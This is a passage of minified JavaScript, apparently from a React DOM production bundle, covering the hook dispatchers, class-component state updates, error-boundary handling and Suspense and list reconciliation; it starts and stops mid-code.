o={tag:o,create:c,deps:m,inst:s,next:null},s=ea.updateQueue,s===null&&(s=Rm(),ea.updateQueue=s),c=s.lastEffect,c===null?s.lastEffect=o.next=o:(m=c.next,c.next=o,o.next=m,s.lastEffect=o),o}function kC(){return et().memoizedState}function jm(o,s,c,m){var v=Yt();ea.flags|=o,v.memoizedState=Hl(1|s,{destroy:void 0},c,m===void 0?null:m)}function Dm(o,s,c,m){var v=et();m=m===void 0?null:m;var y=v.memoizedState.inst;wa!==null&&m!==null&&ub(m,wa.memoizedState.deps)?v.memoizedState=Hl(s,y,c,m):(ea.flags|=o,v.memoizedState=Hl(1|s,y,c,m))}function OC(o,s){jm(8390656,8,o,s)}function Eb(o,s){Dm(2048,8,o,s)}function Vq(o){ea.flags|=4;var s=ea.updateQueue;if(s===null)s=Rm(),ea.updateQueue=s,s.events=[o];else{var c=s.events;c===null?s.events=[o]:c.push(o)}}function UC(o){var s=et().memoizedState;return Vq({ref:s,nextImpl:o}),function(){if((Ta&2)!==0)throw Error(n(440));return s.impl.apply(void 0,arguments)}}function zC(o,s){return Dm(4,2,o,s)}function BC(o,s){return Dm(4,4,o,s)}function FC(o,s){if(typeof s=="function"){o=o();var c=s(o);return function(){typeof c=="function"?c():s(null)}}if(s!=null)return o=o(),s.current=o,function(){s.current=null}}function VC(o,s,c){c=c!=null?c.concat([o]):null,Dm(4,4,FC.bind(null,s,o),c)}function Sb(){}function HC(o,s){var c=et();s=s===void 0?null:s;var m=c.memoizedState;return s!==null&&ub(s,m[1])?m[0]:(c.memoizedState=[o,s],o)}function GC(o,s){var c=et();s=s===void 0?null:s;var m=c.memoizedState;if(s!==null&&ub(s,m[1]))return m[0];if(m=o(),_r){ya(!0);try{o()}finally{ya(!1)}}return c.memoizedState=[m,s],m}function Cb(o,s,c){return c===void 0||(To&1073741824)!==0&&(la&261930)===0?o.memoizedState=s:(o.memoizedState=c,o=QT(),ea.lanes|=o,Es|=o,c)}function QC(o,s,c,m){return Sn(c,s)?c:Bl.current!==null?(o=Cb(o,c,m),Sn(o,s)||(ct=!0),o):(To&42)===0||(To&1073741824)!==0&&(la&261930)===0?(ct=!0,o.memoizedState=c):(o=QT(),ea.lanes|=o,Es|=o,s)}function JC(o,s,c,m,v){var y=re.p;re.p=y!==0&&8>y?y:8;var x=Z.T,D={};Z.T=D,Ab(o,!1,s,c);try{var K=v(),oe=Z.S;if(oe!==null&&oe(D,K),K!==null&&typeof K=="object"&&typeof K.then=="function"){var he=Oq(K,m);ku(o,s,he,Ln(o))}else ku(o,s,m,Ln(o))}catch(be){ku(o,s,{then:function(){},status:"rejected",reason:be},Ln())}finally{re.p=y,x!==null&&D.types!==null&&(x.types=D.types),Z.T=x}}function Hq(){}function Tb(o,s,c,m){if(o.tag!==5)throw Error(n(476));var v=WC(o).queue;JC(o,v,s,Ee,c===null?Hq:function(){return KC(o),c(m)})}function WC(o){var s=o.memoizedState;if(s!==null)return s;s={memoizedState:Ee,baseState:Ee,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:xo,lastRenderedState:Ee},next:null};var c={};return s.next={memoizedState:c,baseState:c,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:xo,lastRenderedState:c},next:null},o.memoizedState=s,o=o.alternate,o!==null&&(o.memoizedState=s),s}function KC(o){var s=WC(o);s.next===null&&(s=o.alternate.memoizedState),ku(o,s.next.queue,{},Ln())}function xb(){return Nt(ed)}function YC(){return et().memoizedState}function $C(){return et().memoizedState}function Gq(o){for(var s=o.return;s!==null;){switch(s.tag){case 24:case 3:var c=Ln();o=fs(c);var m=hs(s,o,c);m!==null&&(pn(m,s,c),Du(m,s,c)),s={cache:Zg()},o.payload=s;return}s=s.return}}function Qq(o,s,c){var m=Ln();c={lane:m,revertLane:0,gesture:null,action:c,hasEagerState:!1,eagerState:null,next:null},Mm(o)?ZC(s,c):(c=Fg(o,s,c,m),c!==null&&(pn(c,o,m),eT(c,s,m)))}function XC(o,s,c){var m=Ln();ku(o,s,c,m)}function ku(o,s,c,m){var v={lane:m,revertLane:0,gesture:null,action:c,hasEagerState:!1,eagerState:null,next:null};if(Mm(o))ZC(s,v);else{var y=o.alternate;if(o.lanes===0&&(y===null||y.lanes===0)&&(y=s.lastRenderedReducer,y!==null))try{var x=s.lastRenderedState,D=y(x,c);if(v.hasEagerState=!0,v.eagerState=D,Sn(D,x))return mm(o,s,v,0),Ma===null&&pm(),!1}catch{}if(c=Fg(o,s,v,m),c!==null)return pn(c,o,m),eT(c,s,m),!0}return!1}function Ab(o,s,c,m){if(m={lane:2,revertLane:nv(),gesture:null,action:m,hasEagerState:!1,eagerState:null,next:null},Mm(o)){if(s)throw Error(n(479))}else s=Fg(o,c,m,2),s!==null&&pn(s,o,2)}function Mm(o){var s=o.alternate;return o===ea||s!==null&&s===ea}function ZC(o,s){Fl=Pm=!0;var c=o.pending;c===null?s.next=s:(s.next=c.next,c.next=s),o.pending=s}function eT(o,s,c){if((c&4194048)!==0){var m=s.lanes;m&=o.pendingLanes,c|=m,s.lanes=c,ou(o,c)}}var Ou={readContext:Nt,use:Im,useCallback:Ka,useContext:Ka,useEffect:Ka,useImperativeHandle:Ka,useLayoutEffect:Ka,useInsertionEffect:Ka,useMemo:Ka,useReducer:Ka,useRef:Ka,useState:Ka,useDebugValue:Ka,useDeferredValue:Ka,useTransition:Ka,useSyncExternalStore:Ka,useId:Ka,useHostTransitionStatus:Ka,useFormState:Ka,useActionState:Ka,useOptimistic:Ka,useMemoCache:Ka,useCacheRefresh:Ka};Ou.useEffectEvent=Ka;var aT={readContext:Nt,use:Im,useCallback:function(o,s){return Yt().memoizedState=[o,s===void 0?null:s],o},useContext:Nt,useEffect:OC,useImperativeHandle:function(o,s,c){c=c!=null?c.concat([o]):null,jm(4194308,4,FC.bind(null,s,o),c)},useLayoutEffect:function(o,s){return jm(4194308,4,o,s)},useInsertionEffect:function(o,s){jm(4,2,o,s)},useMemo:function(o,s){var c=Yt();s=s===void 0?null:s;var m=o();if(_r){ya(!0);try{o()}finally{ya(!1)}}return c.memoizedState=[m,s],m},useReducer:function(o,s,c){var m=Yt();if(c!==void 0){var v=c(s);if(_r){ya(!0);try{c(s)}finally{ya(!1)}}}else v=s;return m.memoizedState=m.baseState=v,o={pending:null,lanes:0,dispatch:null,lastRenderedReducer:o,lastRenderedState:v},m.queue=o,o=o.dispatch=Qq.bind(null,ea,o),[m.memoizedState,o]},useRef:function(o){var s=Yt();return o={current:o},s.memoizedState=o},useState:function(o){o=vb(o);var s=o.queue,c=XC.bind(null,ea,s);return s.dispatch=c,[o.memoizedState,c]},useDebugValue:Sb,useDeferredValue:function(o,s){var c=Yt();return Cb(c,o,s)},useTransition:function(){var o=vb(!1);return o=JC.bind(null,ea,o.queue,!0,!1),Yt().memoizedState=o,[!1,o]},useSyncExternalStore:function(o,s,c){var m=ea,v=Yt();if(fa){if(c===void 0)throw Error(n(407));c=c()}else{if(c=s(),Ma===null)throw Error(n(349));(la&127)!==0||CC(m,s,c)}v.memoizedState=c;var y={value:c,getSnapshot:s};return v.queue=y,OC(xC.bind(null,m,y,o),[o]),m.flags|=2048,Hl(9,{destroy:void 0},TC.bind(null,m,y,c,s),null),c},useId:function(){var o=Yt(),s=Ma.identifierPrefix;if(fa){var c=Wi,m=Ji;c=(m&~(1<<32-We(m)-1)).toString(32)+c,s="_"+s+"R_"+c,c=Lm++,0<c&&(s+="H"+c.toString(32)),s+="_"}else c=Uq++,s="_"+s+"r_"+c.toString(32)+"_";return o.memoizedState=s},useHostTransitionStatus:xb,useFormState:MC,useActionState:MC,useOptimistic:function(o){var s=Yt();s.memoizedState=s.baseState=o;var c={pending:null,lanes:0,dispatch:null,lastRenderedReducer:null,lastRenderedState:null};return s.queue=c,s=Ab.bind(null,ea,!0,c),c.dispatch=s,[o,s]},useMemoCache:hb,useCacheRefresh:function(){return Yt().memoizedState=Gq.bind(null,ea)},useEffectEvent:function(o){var s=Yt(),c={impl:o};return s.memoizedState=c,function(){if((Ta&2)!==0)throw Error(n(440));return c.impl.apply(void 0,arguments)}}},Pb={readContext:Nt,use:Im,useCallback:HC,useContext:Nt,useEffect:Eb,useImperativeHandle:VC,useInsertionEffect:zC,useLayoutEffect:BC,useMemo:GC,useReducer:wm,useRef:kC,useState:function(){return wm(xo)},useDebugValue:Sb,useDeferredValue:function(o,s){var c=et();return QC(c,wa.memoizedState,o,s)},useTransition:function(){var o=wm(xo)[0],s=et().memoizedState;return[typeof o=="boolean"?o:qu(o),s]},useSyncExternalStore:SC,useId:YC,useHostTransitionStatus:xb,useFormState:NC,useActionState:NC,useOptimistic:function(o,s){var c=et();return LC(c,wa,o,s)},useMemoCache:hb,useCacheRefresh:$C};Pb.useEffectEvent=UC;var tT={readContext:Nt,use:Im,useCallback:HC,useContext:Nt,useEffect:Eb,useImperativeHandle:VC,useInsertionEffect:zC,useLayoutEffect:BC,useMemo:GC,useReducer:bb,useRef:kC,useState:function(){return bb(xo)},useDebugValue:Sb,useDeferredValue:function(o,s){var c=et();return wa===null?Cb(c,o,s):QC(c,wa.memoizedState,o,s)},useTransition:function(){var o=bb(xo)[0],s=et().memoizedState;return[typeof o=="boolean"?o:qu(o),s]},useSyncExternalStore:SC,useId:YC,useHostTransitionStatus:xb,useFormState:qC,useActionState:qC,useOptimistic:function(o,s){var c=et();return wa!==null?LC(c,wa,o,s):(c.baseState=o,[o,c.queue.dispatch])},useMemoCache:hb,useCacheRefresh:$C};tT.useEffectEvent=UC;function Lb(o,s,c,m){s=o.memoizedState,c=c(m,s),c=c==null?s:h({},s,c),o.memoizedState=c,o.lanes===0&&(o.updateQueue.baseState=c)}var Rb={enqueueSetState:function(o,s,c){o=o._reactInternals;var m=Ln(),v=fs(m);v.payload=s,c!=null&&(v.callback=c),s=hs(o,v,m),s!==null&&(pn(s,o,m),Du(s,o,m))},enqueueReplaceState:function(o,s,c){o=o._reactInternals;var m=Ln(),v=fs(m);v.tag=1,v.payload=s,c!=null&&(v.callback=c),s=hs(o,v,m),s!==null&&(pn(s,o,m),Du(s,o,m))},enqueueForceUpdate:function(o,s){o=o._reactInternals;var c=Ln(),m=fs(c);m.tag=2,s!=null&&(m.callback=s),s=hs(o,m,c),s!==null&&(pn(s,o,c),Du(s,o,c))}};function nT(o,s,c,m,v,y,x){return o=o.stateNode,typeof o.shouldComponentUpdate=="function"?o.shouldComponentUpdate(m,y,x):s.prototype&&s.prototype.isPureReactComponent?!xu(c,m)||!xu(v,y):!0}function iT(o,s,c,m){o=s.state,typeof s.componentWillReceiveProps=="function"&&s.componentWillReceiveProps(c,m),typeof s.UNSAFE_componentWillReceiveProps=="function"&&s.UNSAFE_componentWillReceiveProps(c,m),s.state!==o&&Rb.enqueueReplaceState(s,s.state,null)}function qr(o,s){var c=s;if("ref"in s){c={};for(var m in s)m!=="ref"&&(c[m]=s[m])}if(o=o.defaultProps){c===s&&(c=h({},c));for(var v in o)c[v]===void 0&&(c[v]=o[v])}return c}function oT(o){dm(o)}function sT(o){console.error(o)}function rT(o){dm(o)}function Nm(o,s){try{var c=o.onUncaughtError;c(s.value,{componentStack:s.stack})}catch(m){setTimeout(function(){throw m})}}function lT(o,s,c){try{var m=o.onCaughtError;m(c.value,{componentStack:c.stack,errorBoundary:s.tag===1?s.stateNode:null})}catch(v){setTimeout(function(){throw v})}}function Ib(o,s,c){return c=fs(c),c.tag=3,c.payload={element:null},c.callback=function(){Nm(o,s)},c}function cT(o){return o=fs(o),o.tag=3,o}function uT(o,s,c,m){var v=c.type.getDerivedStateFromError;if(typeof v=="function"){var y=m.value;o.payload=function(){return v(y)},o.callback=function(){lT(s,c,m)}}var x=c.stateNode;x!==null&&typeof x.componentDidCatch=="function"&&(o.callback=function(){lT(s,c,m),typeof v!="function"&&(Ss===null?Ss=new Set([this]):Ss.add(this));var D=m.stack;this.componentDidCatch(m.value,{componentStack:D!==null?D:""})})}function Jq(o,s,c,m,v){if(c.flags|=32768,m!==null&&typeof m=="object"&&typeof m.then=="function"){if(s=c.alternate,s!==null&&ql(s,c,v,!0),c=Tn.current,c!==null){switch(c.tag){case 31:case 13:return Hn===null?Qm():c.alternate===null&&Ya===0&&(Ya=3),c.flags&=-257,c.flags|=65536,c.lanes=v,m===Sm?c.flags|=16384:(s=c.updateQueue,s===null?c.updateQueue=new Set([m]):s.add(m),ev(o,m,v)),!1;case 22:return c.flags|=65536,m===Sm?c.flags|=16384:(s=c.updateQueue,s===null?(s={transitions:null,markerInstances:null,retryQueue:new Set([m])},c.updateQueue=s):(c=s.retryQueue,c===null?s.retryQueue=new Set([m]):c.add(m)),ev(o,m,v)),!1}throw Error(n(435,c.tag))}return ev(o,m,v),Qm(),!1}if(fa)return s=Tn.current,s!==null?((s.flags&65536)===0&&(s.flags|=256),s.flags|=65536,s.lanes=v,m!==Wg&&(o=Error(n(422),{cause:m}),Lu(zn(o,c)))):(m!==Wg&&(s=Error(n(423),{cause:m}),Lu(zn(s,c))),o=o.current.alternate,o.flags|=65536,v&=-v,o.lanes|=v,m=zn(m,c),v=Ib(o.stateNode,m,v),ob(o,v),Ya!==4&&(Ya=2)),!1;var y=Error(n(520),{cause:m});if(y=zn(y,c),Qu===null?Qu=[y]:Qu.push(y),Ya!==4&&(Ya=2),s===null)return!0;m=zn(m,c),c=s;do{switch(c.tag){case 3:return c.flags|=65536,o=v&-v,c.lanes|=o,o=Ib(c.stateNode,m,o),ob(c,o),!1;case 1:if(s=c.type,y=c.stateNode,(c.flags&128)===0&&(typeof s.getDerivedStateFromError=="function"||y!==null&&typeof y.componentDidCatch=="function"&&(Ss===null||!Ss.has(y))))return c.flags|=65536,v&=-v,c.lanes|=v,v=cT(v),uT(v,o,c,m),ob(c,v),!1}c=c.return}while(c!==null);return!1}var wb=Error(n(461)),ct=!1;function _t(o,s,c,m){s.child=o===null?fC(s,null,c,m):Nr(s,o.child,c,m)}function dT(o,s,c,m,v){c=c.render;var y=s.ref;if("ref"in m){var x={};for(var D in m)D!=="ref"&&(x[D]=m[D])}else x=m;return wr(s),m=db(o,s,c,x,y,v),D=pb(),o!==null&&!ct?(mb(o,s,v),Ao(o,s,v)):(fa&&D&&Qg(s),s.flags|=1,_t(o,s,m,v),s.child)}function pT(o,s,c,m,v){if(o===null){var y=c.type;return typeof y=="function"&&!Vg(y)&&y.defaultProps===void 0&&c.compare===null?(s.tag=15,s.type=y,mT(o,s,y,m,v)):(o=hm(c.type,null,m,s,s.mode,v),o.ref=s.ref,o.return=s,s.child=o)}if(y=o.child,!Ob(o,v)){var x=y.memoizedProps;if(c=c.compare,c=c!==null?c:xu,c(x,m)&&o.ref===s.ref)return Ao(o,s,v)}return s.flags|=1,o=yo(y,m),o.ref=s.ref,o.return=s,s.child=o}function mT(o,s,c,m,v){if(o!==null){var y=o.memoizedProps;if(xu(y,m)&&o.ref===s.ref)if(ct=!1,s.pendingProps=m=y,Ob(o,v))(o.flags&131072)!==0&&(ct=!0);else return s.lanes=o.lanes,Ao(o,s,v)}return jb(o,s,c,m,v)}function fT(o,s,c,m){var v=m.children,y=o!==null?o.memoizedState:null;if(o===null&&s.stateNode===null&&(s.stateNode={_visibility:1,_pendingMarkers:null,_retryCache:null,_transitions:null}),m.mode==="hidden"){if((s.flags&128)!==0){if(y=y!==null?y.baseLanes|c:c,o!==null){for(m=s.child=o.child,v=0;m!==null;)v=v|m.lanes|m.childLanes,m=m.sibling;m=v&~y}else m=0,s.child=null;return hT(o,s,y,c,m)}if((c&536870912)!==0)s.memoizedState={baseLanes:0,cachePool:null},o!==null&&ym(s,y!==null?y.cachePool:null),y!==null?bC(s,y):rb(),vC(s);else return m=s.lanes=536870912,hT(o,s,y!==null?y.baseLanes|c:c,c,m)}else y!==null?(ym(s,y.cachePool),bC(s,y),bs(),s.memoizedState=null):(o!==null&&ym(s,null),rb(),bs());return _t(o,s,v,c),s.child}function Uu(o,s){return o!==null&&o.tag===22||s.stateNode!==null||(s.stateNode={_visibility:1,_pendingMarkers:null,_retryCache:null,_transitions:null}),s.sibling}function hT(o,s,c,m,v){var y=ab();return y=y===null?null:{parent:rt._currentValue,pool:y},s.memoizedState={baseLanes:c,cachePool:y},o!==null&&ym(s,null),rb(),vC(s),o!==null&&ql(o,s,m,!0),s.childLanes=v,null}function _m(o,s){return s=km({mode:s.mode,children:s.children},o.mode),s.ref=o.ref,o.child=s,s.return=o,s}function gT(o,s,c){return Nr(s,o.child,null,c),o=_m(s,s.pendingProps),o.flags|=2,xn(s),s.memoizedState=null,o}function Wq(o,s,c){var m=s.pendingProps,v=(s.flags&128)!==0;if(s.flags&=-129,o===null){if(fa){if(m.mode==="hidden")return o=_m(s,m),s.lanes=536870912,Uu(null,o);if(cb(s),(o=ka)?(o=Rx(o,Vn),o=o!==null&&o.data==="&"?o:null,o!==null&&(s.memoizedState={dehydrated:o,treeContext:cs!==null?{id:Ji,overflow:Wi}:null,retryLane:536870912,hydrationErrors:null},c=ZS(o),c.return=s,s.child=c,Mt=s,ka=null)):o=null,o===null)throw ds(s);return s.lanes=536870912,null}return _m(s,m)}var y=o.memoizedState;if(y!==null){var x=y.dehydrated;if(cb(s),v)if(s.flags&256)s.flags&=-257,s=gT(o,s,c);else if(s.memoizedState!==null)s.child=o.child,s.flags|=128,s=null;else throw Error(n(558));else if(ct||ql(o,s,c,!1),v=(c&o.childLanes)!==0,ct||v){if(m=Ma,m!==null&&(x=su(m,c),x!==0&&x!==y.retryLane))throw y.retryLane=x,Pr(o,x),pn(m,o,x),wb;Qm(),s=gT(o,s,c)}else o=y.treeContext,ka=Gn(x.nextSibling),Mt=s,fa=!0,us=null,Vn=!1,o!==null&&tC(s,o),s=_m(s,m),s.flags|=4096;return s}return o=yo(o.child,{mode:m.mode,children:m.children}),o.ref=s.ref,s.child=o,o.return=s,o}function qm(o,s){var c=s.ref;if(c===null)o!==null&&o.ref!==null&&(s.flags|=4194816);else{if(typeof c!="function"&&typeof c!="object")throw Error(n(284));(o===null||o.ref!==c)&&(s.flags|=4194816)}}function jb(o,s,c,m,v){return wr(s),c=db(o,s,c,m,void 0,v),m=pb(),o!==null&&!ct?(mb(o,s,v),Ao(o,s,v)):(fa&&m&&Qg(s),s.flags|=1,_t(o,s,c,v),s.child)}function bT(o,s,c,m,v,y){return wr(s),s.updateQueue=null,c=EC(s,m,c,v),yC(o),m=pb(),o!==null&&!ct?(mb(o,s,y),Ao(o,s,y)):(fa&&m&&Qg(s),s.flags|=1,_t(o,s,c,y),s.child)}function vT(o,s,c,m,v){if(wr(s),s.stateNode===null){var y=Dl,x=c.contextType;typeof x=="object"&&x!==null&&(y=Nt(x)),y=new c(m,y),s.memoizedState=y.state!==null&&y.state!==void 0?y.state:null,y.updater=Rb,s.stateNode=y,y._reactInternals=s,y=s.stateNode,y.props=m,y.state=s.memoizedState,y.refs={},nb(s),x=c.contextType,y.context=typeof x=="object"&&x!==null?Nt(x):Dl,y.state=s.memoizedState,x=c.getDerivedStateFromProps,typeof x=="function"&&(Lb(s,c,x,m),y.state=s.memoizedState),typeof c.getDerivedStateFromProps=="function"||typeof y.getSnapshotBeforeUpdate=="function"||typeof y.UNSAFE_componentWillMount!="function"&&typeof y.componentWillMount!="function"||(x=y.state,typeof y.componentWillMount=="function"&&y.componentWillMount(),typeof y.UNSAFE_componentWillMount=="function"&&y.UNSAFE_componentWillMount(),x!==y.state&&Rb.enqueueReplaceState(y,y.state,null),Nu(s,m,y,v),Mu(),y.state=s.memoizedState),typeof y.componentDidMount=="function"&&(s.flags|=4194308),m=!0}else if(o===null){y=s.stateNode;var D=s.memoizedProps,K=qr(c,D);y.props=K;var oe=y.context,he=c.contextType;x=Dl,typeof he=="object"&&he!==null&&(x=Nt(he));var be=c.getDerivedStateFromProps;he=typeof be=="function"||typeof y.getSnapshotBeforeUpdate=="function",D=s.pendingProps!==D,he||typeof y.UNSAFE_componentWillReceiveProps!="function"&&typeof y.componentWillReceiveProps!="function"||(D||oe!==x)&&iT(s,y,m,x),ms=!1;var se=s.memoizedState;y.state=se,Nu(s,m,y,v),Mu(),oe=s.memoizedState,D||se!==oe||ms?(typeof be=="function"&&(Lb(s,c,be,m),oe=s.memoizedState),(K=ms||nT(s,c,K,m,se,oe,x))?(he||typeof y.UNSAFE_componentWillMount!="function"&&typeof y.componentWillMount!="function"||(typeof y.componentWillMount=="function"&&y.componentWillMount(),typeof y.UNSAFE_componentWillMount=="function"&&y.UNSAFE_componentWillMount()),typeof y.componentDidMount=="function"&&(s.flags|=4194308)):(typeof y.componentDidMount=="function"&&(s.flags|=4194308),s.memoizedProps=m,s.memoizedState=oe),y.props=m,y.state=oe,y.context=x,m=K):(typeof y.componentDidMount=="function"&&(s.flags|=4194308),m=!1)}else{y=s.stateNode,ib(o,s),x=s.memoizedProps,he=qr(c,x),y.props=he,be=s.pendingProps,se=y.context,oe=c.contextType,K=Dl,typeof oe=="object"&&oe!==null&&(K=Nt(oe)),D=c.getDerivedStateFromProps,(oe=typeof D=="function"||typeof y.getSnapshotBeforeUpdate=="function")||typeof y.UNSAFE_componentWillReceiveProps!="function"&&typeof y.componentWillReceiveProps!="function"||(x!==be||se!==K)&&iT(s,y,m,K),ms=!1,se=s.memoizedState,y.state=se,Nu(s,m,y,v),Mu();var ue=s.memoizedState;x!==be||se!==ue||ms||o!==null&&o.dependencies!==null&&bm(o.dependencies)?(typeof D=="function"&&(Lb(s,c,D,m),ue=s.memoizedState),(he=ms||nT(s,c,he,m,se,ue,K)||o!==null&&o.dependencies!==null&&bm(o.dependencies))?(oe||typeof y.UNSAFE_componentWillUpdate!="function"&&typeof y.componentWillUpdate!="function"||(typeof y.componentWillUpdate=="function"&&y.componentWillUpdate(m,ue,K),typeof y.UNSAFE_componentWillUpdate=="function"&&y.UNSAFE_componentWillUpdate(m,ue,K)),typeof y.componentDidUpdate=="function"&&(s.flags|=4),typeof y.getSnapshotBeforeUpdate=="function"&&(s.flags|=1024)):(typeof y.componentDidUpdate!="function"||x===o.memoizedProps&&se===o.memoizedState||(s.flags|=4),typeof y.getSnapshotBeforeUpdate!="function"||x===o.memoizedProps&&se===o.memoizedState||(s.flags|=1024),s.memoizedProps=m,s.memoizedState=ue),y.props=m,y.state=ue,y.context=K,m=he):(typeof y.componentDidUpdate!="function"||x===o.memoizedProps&&se===o.memoizedState||(s.flags|=4),typeof y.getSnapshotBeforeUpdate!="function"||x===o.memoizedProps&&se===o.memoizedState||(s.flags|=1024),m=!1)}return y=m,qm(o,s),m=(s.flags&128)!==0,y||m?(y=s.stateNode,c=m&&typeof c.getDerivedStateFromError!="function"?null:y.render(),s.flags|=1,o!==null&&m?(s.child=Nr(s,o.child,null,v),s.child=Nr(s,null,c,v)):_t(o,s,c,v),s.memoizedState=y.state,o=s.child):o=Ao(o,s,v),o}function yT(o,s,c,m){return Rr(),s.flags|=256,_t(o,s,c,m),s.child}var Db={dehydrated:null,treeContext:null,retryLane:0,hydrationErrors:null};function Mb(o){return{baseLanes:o,cachePool:lC()}}function Nb(o,s,c){return o=o!==null?o.childLanes&~c:0,s&&(o|=Pn),o}function ET(o,s,c){var m=s.pendingProps,v=!1,y=(s.flags&128)!==0,x;if((x=y)||(x=o!==null&&o.memoizedState===null?!1:(Za.current&2)!==0),x&&(v=!0,s.flags&=-129),x=(s.flags&32)!==0,s.flags&=-33,o===null){if(fa){if(v?gs(s):bs(),(o=ka)?(o=Rx(o,Vn),o=o!==null&&o.data!=="&"?o:null,o!==null&&(s.memoizedState={dehydrated:o,treeContext:cs!==null?{id:Ji,overflow:Wi}:null,retryLane:536870912,hydrationErrors:null},c=ZS(o),c.return=s,s.child=c,Mt=s,ka=null)):o=null,o===null)throw ds(s);return gv(o)?s.lanes=32:s.lanes=536870912,null}var D=m.children;return m=m.fallback,v?(bs(),v=s.mode,D=km({mode:"hidden",children:D},v),m=Lr(m,v,c,null),D.return=s,m.return=s,D.sibling=m,s.child=D,m=s.child,m.memoizedState=Mb(c),m.childLanes=Nb(o,x,c),s.memoizedState=Db,Uu(null,m)):(gs(s),_b(s,D))}var K=o.memoizedState;if(K!==null&&(D=K.dehydrated,D!==null)){if(y)s.flags&256?(gs(s),s.flags&=-257,s=qb(o,s,c)):s.memoizedState!==null?(bs(),s.child=o.child,s.flags|=128,s=null):(bs(),D=m.fallback,v=s.mode,m=km({mode:"visible",children:m.children},v),D=Lr(D,v,c,null),D.flags|=2,m.return=s,D.return=s,m.sibling=D,s.child=m,Nr(s,o.child,null,c),m=s.child,m.memoizedState=Mb(c),m.childLanes=Nb(o,x,c),s.memoizedState=Db,s=Uu(null,m));else if(gs(s),gv(D)){if(x=D.nextSibling&&D.nextSibling.dataset,x)var oe=x.dgst;x=oe,m=Error(n(419)),m.stack="",m.digest=x,Lu({value:m,source:null,stack:null}),s=qb(o,s,c)}else if(ct||ql(o,s,c,!1),x=(c&o.childLanes)!==0,ct||x){if(x=Ma,x!==null&&(m=su(x,c),m!==0&&m!==K.retryLane))throw K.retryLane=m,Pr(o,m),pn(x,o,m),wb;hv(D)||Qm(),s=qb(o,s,c)}else hv(D)?(s.flags|=192,s.child=o.child,s=null):(o=K.treeContext,ka=Gn(D.nextSibling),Mt=s,fa=!0,us=null,Vn=!1,o!==null&&tC(s,o),s=_b(s,m.children),s.flags|=4096);return s}return v?(bs(),D=m.fallback,v=s.mode,K=o.child,oe=K.sibling,m=yo(K,{mode:"hidden",children:m.children}),m.subtreeFlags=K.subtreeFlags&65011712,oe!==null?D=yo(oe,D):(D=Lr(D,v,c,null),D.flags|=2),D.return=s,m.return=s,m.sibling=D,s.child=m,Uu(null,m),m=s.child,D=o.child.memoizedState,D===null?D=Mb(c):(v=D.cachePool,v!==null?(K=rt._currentValue,v=v.parent!==K?{parent:K,pool:K}:v):v=lC(),D={baseLanes:D.baseLanes|c,cachePool:v}),m.memoizedState=D,m.childLanes=Nb(o,x,c),s.memoizedState=Db,Uu(o.child,m)):(gs(s),c=o.child,o=c.sibling,c=yo(c,{mode:"visible",children:m.children}),c.return=s,c.sibling=null,o!==null&&(x=s.deletions,x===null?(s.deletions=[o],s.flags|=16):x.push(o)),s.child=c,s.memoizedState=null,c)}function _b(o,s){return s=km({mode:"visible",children:s},o.mode),s.return=o,o.child=s}function km(o,s){return o=Cn(22,o,null,s),o.lanes=0,o}function qb(o,s,c){return Nr(s,o.child,null,c),o=_b(s,s.pendingProps.children),o.flags|=2,s.memoizedState=null,o}function ST(o,s,c){o.lanes|=s;var m=o.alternate;m!==null&&(m.lanes|=s),$g(o.return,s,c)}function kb(o,s,c,m,v,y){var x=o.memoizedState;x===null?o.memoizedState={isBackwards:s,rendering:null,renderingStartTime:0,last:m,tail:c,tailMode:v,treeForkCount:y}:(x.isBackwards=s,x.rendering=null,x.renderingStartTime=0,x.last=m,x.tail=c,x.tailMode=v,x.treeForkCount=y)}function CT(o,s,c){var m=s.pendingProps,v=m.revealOrder,y=m.tail;m=m.children;var x=Za.current,D=(x&2)!==0;if(D?(x=x&1|2,s.flags|=128):x&=1,B(Za,x),_t(o,s,m,c),m=fa?Pu:0,!D&&o!==null&&(o.flags&128)!==0)e:for(o=s.child;o!==null;){if(o.tag===13)o.memoizedState!==null&&ST(o,c,s);else if(o.tag===19)ST(o,c,s);else if(o.child!==null){o.child.return=o,o=o.child;continue}if(o===s)break e;for(;o.sibling===null;){if(o.return===null||o.return===s)break e;o=o.return}o.sibling.return=o.return,o=o.sibling}switch(v){case"forwards":for(c=s.child,v=null;c!==null;)o=c.alternate,o!==null&&Am(o)===null&&(v=c),c=c.sibling;c=v,c===null?(v=s.child,s.child=null):(v=c.sibling,c.sibling=null),kb(s,!1,v,c,y,m);break;case"backwards":case"unstable_legacy-backwards":for(c=null,v=s.child,s.child=null;v!==null;){if(o=v.alternate,o!==null&&Am(o)===null){s.child=v;break}o=v.sibling,v.sibling=c,c=v,v=o}kb(s,!0,c,null,y,m);break;case"together":kb(s,!1,null,null,void 0,m);break;default:s.memoizedState=null}return s.child}function Ao(o,s,c){if(o!==null&&(s.dependencies=o.dependencies),Es|=s.lanes,(c&s.childLanes)===0)if(o!==null){if(ql(o,s,c,!1),(c&s.childLanes)===0)return null}else return null;if(o!==null&&s.child!==o.child)throw Error(n(153));if(s.child!==null){for(o=s.child,c=yo(o,o.pendingProps),s.child=c,c.return=s;o.sibling!==null;)o=o.sibling,c=c.sibling=yo(o,o.pendingProps),c.return=s;c.sibling=null}return s.child}function Ob(o,s){return(o.lanes&s)!==0?!0:(o=o.dependencies,!!(o!==null&&bm(o)))}function Kq(o,s,c){switch(s.tag){case 3:xa(s,s.stateNode.containerInfo),ps(s,rt,o.memoizedState.cache),Rr();break;case 27:case 5:St(s);break;case 4:xa(s,s.stateNode.containerInfo);break;case 10:ps(s,s.type,s.memoizedProps.value);break;case 31:if(s.memoizedState!==null)return s.flags|=128,cb(s),null;break;case 13:var m=s.memoizedState;if(m!==null)return m.dehydrated!==null?(gs(s),s.flags|=128,null):(c&s.child.childLanes)!==0?ET(o,s,c):(gs(s),o=Ao(o,s,c),o!==null?o.sibling:null);gs(s);break;case 19:var v=(o.flags&128)!==0;if(m=(c&s.childLanes)!==0,m||(ql(o,s,c,!1),m=(c&s.childLanes)!==0),v){if(m)return CT(o,s,c);s.flags|=128}if(v=s.memoizedState,v!==null&&(v.rendering=null,v.tail=null,v.lastEffect=null),B(Za,Za.current),m)break;return null;case 22:return s.lanes=0,fT(o,s,c,s.pendingProps);case 24:ps(s,rt,o.memoizedState.cache)}return Ao(o,s,c)}function TT(o,s,c){if(o!==null)if(o.memoizedProps!==s.pendingProps)ct=!0;else{if(!Ob(o,c)&&(s.flags&128)===0)return 